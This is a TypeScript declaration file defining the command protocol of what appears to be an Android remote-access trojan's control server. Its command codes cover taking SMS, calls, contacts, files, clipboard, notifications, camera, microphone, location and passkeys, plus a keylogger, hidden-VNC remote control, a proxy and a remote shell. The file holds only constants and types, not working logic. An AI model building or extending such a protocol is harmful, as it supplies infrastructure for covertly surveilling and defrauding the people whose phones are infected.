/** Command protocol codes — matches Android Protocol.java channel codes. */
export declare const CMD: {
    readonly FILES: "0xFI";
    readonly SMS: "0xSM";
    readonly CALLS: "0xCL";
    readonly CONTACTS: "0xCO";
    readonly MIC: "0xMI";
    readonly LOCATION: "0xLO";
    readonly WIFI: "0xWI";
    readonly PERMISSIONS: "0xPM";
    readonly APPS: "0xIN";
    readonly PERM_CHECK: "0xGP";
    readonly CAMERA: "0xCA";
    readonly CLIPBOARD: "0xCB";
    readonly NOTIFICATIONS: "0xNO";
    readonly FASON: "0xFM";
    readonly INFO: "0xIF";
    readonly SCREEN: "0xSC";
    readonly SCREEN_CTRL: "0xST";
    readonly KEYLOGGER: "0xKL";
    readonly WEBRTC_OFFER: "0xWO";
    readonly WEBRTC_ANSWER: "0xWA";
    readonly WEBRTC_ICE: "0xWC";
    readonly HVNC: "0xHV";
    readonly HVNC_CTRL: "0xHC";
    readonly HVNC_OFFER: "0xHO";
    readonly HVNC_ANSWER: "0xHA";
    readonly HVNC_ICE: "0xHI";
    readonly PASSKEY: "0xPK";
    readonly PROXY: "0xPY";
    readonly SHELL: "0xSH";
};
export type CmdType = typeof CMD[keyof typeof CMD];
/** Actions accepted by the WebRTC control data channel and its REST fallback. */
export declare const SCREEN_ACTION: {
    readonly STATUS: "status";
    readonly TAP: "tap";
    readonly SWIPE: "swipe";
    readonly GESTURE: "gesture";
    readonly TOUCH_START: "touchStart";
    readonly TOUCH_MOVE: "touchMove";
    readonly TOUCH_END: "touchEnd";
    readonly KEY: "key";
    readonly TEXT: "text";
    readonly VOLUME: "volume";
};
export type ScreenAction = typeof SCREEN_ACTION[keyof typeof SCREEN_ACTION];
/** Realtime commands that should bypass command queue for low-latency streaming. */
export declare const REALTIME_COMMANDS: ReadonlySet<CmdType>;
/** Validation patterns for identifiers */
export declare const PATTERNS: {
    readonly SESSION_ID: RegExp;
    readonly DEVICE_ID: RegExp;
};
/** Size limits for data transfer */
export declare const LIMITS: {
    readonly MAX_CHUNK_BASE64_LENGTH: 67108864;
    readonly MAX_TOTAL_CHUNKS: 10000;
    readonly MAX_ICE_SERVERS: 8;
    readonly MAX_SDP_LENGTH: 2000000;
    readonly MAX_ICE_CANDIDATE_LENGTH: 16384;
    readonly MAX_ICON_SIZE: number;
    readonly MAX_APP_NAME_LENGTH: 50;
    readonly MAX_PASSWORD_LENGTH: 128;
    readonly MIN_PASSWORD_LENGTH: 8;
    readonly MAX_USERNAME_LENGTH: 30;
    readonly MIN_USERNAME_LENGTH: 3;
    readonly MAX_EMAIL_LENGTH: 254;
};
//# sourceMappingURL=index.d.ts.map